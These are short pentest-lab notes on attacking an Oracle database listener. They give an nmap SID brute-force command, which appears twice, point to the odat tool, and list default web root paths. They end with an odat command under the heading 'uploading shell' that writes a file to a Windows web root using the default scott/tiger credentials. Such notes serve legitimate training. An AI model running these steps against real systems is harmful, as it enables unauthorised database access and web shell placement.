
**enumerating with nmap script**
```shell-session
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

 **there is also odat.py to check for oracle database vuln. check** [here](https://github.com/quentinhardy/odat)
#### sid bruteforcing with nmap:
```shell-session
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```


DEFAULT PATHS

| **OS**  | **Path**             |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |
**uploading shell:**
```shell-session
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

